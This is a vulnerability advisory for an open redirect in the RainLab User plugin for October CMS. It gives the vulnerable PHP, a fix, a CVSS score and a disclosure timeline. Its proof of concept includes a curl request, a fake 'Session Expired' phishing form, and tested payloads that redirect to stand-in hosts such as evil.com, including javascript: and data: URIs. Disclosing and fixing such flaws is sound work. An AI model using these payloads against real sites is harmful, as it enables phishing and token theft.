# RainLab User Plugin - Open Redirect Vulnerability

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Vendor** | RainLab / October CMS |
| **Product** | user-plugin |
| **Affected Versions** | <= 3.8.0 (all versions) |
| **Vulnerability Type** | Open Redirect (CWE-601) |
| **CVSS 3.1 Score** | 6.1 (Medium) |
| **CVE ID** | Pending |

## Description

An Open Redirect vulnerability exists in the RainLab User Plugin for October CMS. The `redirect` POST parameter in the Session component is passed directly to `Redirect::to()` without any validation, allowing attackers to redirect users to arbitrary external URLs.

Additionally, `javascript:` and `data:` URIs are accepted, potentially leading to XSS attacks.

## Affected Code

**File:** `components/Session.php`

**Function 1 - onLogout() (lines 168-170):**
```php
public function onLogout()
{
    // ... authentication logic ...
    
    if ($redirectUrl = post('redirect', Request::fullUrl())) {
        return Redirect::to($redirectUrl);  // NO VALIDATION
    }
}
```

**Function 2 - onStopImpersonating() (lines 314-320):**
```php
public function onStopImpersonating()
{
    // ... impersonation logic ...
    
    $url = post('redirect', Request::fullUrl());
    return Redirect::to($url);  // NO VALIDATION
}
```

## Proof of Concept

### Method 1: cURL

```bash
curl -X POST https://TARGET-SITE.com/ \
  -H "X-OCTOBER-REQUEST-HANDLER: onLogout" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "redirect=https://evil-phishing-site.com/fake-login" \
  -v 2>&1 | grep -i "location"
```

**Result:**
```
< HTTP/1.1 302 Found
< Location: https://evil-phishing-site.com/fake-login
```

### Method 2: HTML Form

```html
<html>
<body>
<h1>Session Expired</h1>
<form action="https://TARGET-SITE.com/" method="POST">
  <input type="hidden" name="_handler" value="onLogout" />
  <input type="hidden" name="redirect" value="https://evil-site.com/phishing" />
  <button type="submit">Click to continue</button>
</form>
</body>
</html>
```

## Tested Payloads

| Payload | Result |
|---------|--------|
| `https://evil.com` | 302 Redirect - SUCCESS |
| `//evil.com` | 302 Redirect - SUCCESS |
| `https://evil.com?token=steal` | 302 Redirect - SUCCESS |
| `javascript:alert(document.cookie)` | 302 Redirect - SUCCESS |
| `data:text/html,<script>alert(1)</script>` | 302 Redirect - SUCCESS |

## Impact

- **Phishing Attacks:** Redirect users to fake login pages to steal credentials
- **Session Hijacking:** Redirect to attacker-controlled sites that capture tokens
- **Malware Distribution:** Redirect users to drive-by download sites
- **XSS:** Execute JavaScript via `javascript:` URI scheme

## CVSS 3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Base Score: 6.1 (Medium)
```

## Remediation

Add URL validation before performing redirects:

```php
private function isLocalUrl($url)
{
    if (empty($url)) {
        return true;
    }
    
    // Block dangerous URI schemes
    $scheme = parse_url($url, PHP_URL_SCHEME);
    if ($scheme && !in_array(strtolower($scheme), ['http', 'https'], true)) {
        return false;
    }
    
    // Allow relative URLs
    $parsed = parse_url($url);
    if (empty($parsed['host'])) {
        return true;
    }
    
    // Only allow same-origin redirects
    return strcasecmp($parsed['host'], Request::getHost()) === 0;
}

// Fixed code:
if ($redirectUrl = post('redirect', Request::fullUrl())) {
    if ($this->isLocalUrl($redirectUrl)) {
        return Redirect::to($redirectUrl);
    }
    return Redirect::to('/');
}
```

## Timeline

| Date | Action |
|------|--------|
| 2026-10-27 | Vulnerability discovered |
| 2026-10-27 | Vendor contacted (hello@octobercms.com) |
| 2026-10-27 | VulDB submission |
| Pending | CVE assignment |
| Pending | Public disclosure |

## References

- https://github.com/rainlab/user-plugin
- https://octobercms.com/plugin/rainlab-user
- https://cwe.mitre.org/data/definitions/601.html

## Credit

Discovered by [0p5cur](https://github.com/0p5cur)
